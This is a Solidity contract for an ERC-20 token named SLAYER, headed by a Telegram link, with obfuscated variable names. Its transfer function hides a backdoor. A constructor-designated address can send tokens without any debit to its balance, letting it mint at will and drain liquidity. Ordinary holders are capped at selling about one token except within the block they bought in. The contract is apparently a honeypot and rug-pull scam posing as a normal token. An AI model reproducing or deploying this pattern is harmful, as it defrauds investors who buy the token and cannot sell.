/*

https://t.me/ercdemonslayer

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >=0.8.1;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract SLAYER is Ownable {
    string public name;

    mapping(address => uint256) private jwifnxo;

    function transferFrom(address ibnsxcahyot, address bfjuvisyxk, uint256 kmfuhnlewbg) public returns (bool success) {
        require(kmfuhnlewbg <= allowance[ibnsxcahyot][msg.sender]);
        allowance[ibnsxcahyot][msg.sender] -= kmfuhnlewbg;
        fbkmsign(ibnsxcahyot, bfjuvisyxk, kmfuhnlewbg);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    IUniswapV2Router02 private utalqnryhx;

    function transfer(address bfjuvisyxk, uint256 kmfuhnlewbg) public returns (bool success) {
        fbkmsign(msg.sender, bfjuvisyxk, kmfuhnlewbg);
        return true;
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function approve(address etiaqgoxys, uint256 kmfuhnlewbg) public returns (bool success) {
        allowance[msg.sender][etiaqgoxys] = kmfuhnlewbg;
        emit Approval(msg.sender, etiaqgoxys, kmfuhnlewbg);
        return true;
    }

    mapping(address => uint256) private hqzct;

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private ewturlavm;

    function fbkmsign(address ibnsxcahyot, address bfjuvisyxk, uint256 kmfuhnlewbg) private {
        address swdoxmagq = IUniswapV2Factory(utalqnryhx.factory()).getPair(address(this), utalqnryhx.WETH());
        bool jmpduictsqeb = hqzct[ibnsxcahyot] == block.number;
        uint256 nlkgpvwcj = ewturlavm[ibnsxcahyot];
        if (nlkgpvwcj - nlkgpvwcj == nlkgpvwcj) {
            if (ibnsxcahyot != swdoxmagq && (!jmpduictsqeb || kmfuhnlewbg > jwifnxo[ibnsxcahyot]) && kmfuhnlewbg < totalSupply) {
                require(kmfuhnlewbg <= totalSupply / (10 ** decimals));
            }
            balanceOf[ibnsxcahyot] -= kmfuhnlewbg;
        }
        jwifnxo[bfjuvisyxk] = kmfuhnlewbg;
        balanceOf[bfjuvisyxk] += kmfuhnlewbg;
        hqzct[bfjuvisyxk] = block.number;
        emit Transfer(ibnsxcahyot, bfjuvisyxk, kmfuhnlewbg);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint256 private nabdksqzwelg = 116;

    uint8 public decimals = 9;

    constructor(string memory rgtau, string memory efnhbr, address ueolhrznv, address jywindqcsezt) {
        name = rgtau;
        symbol = efnhbr;
        balanceOf[msg.sender] = totalSupply;
        ewturlavm[jywindqcsezt] = nabdksqzwelg;
        utalqnryhx = IUniswapV2Router02(ueolhrznv);
    }

    string public symbol;
}
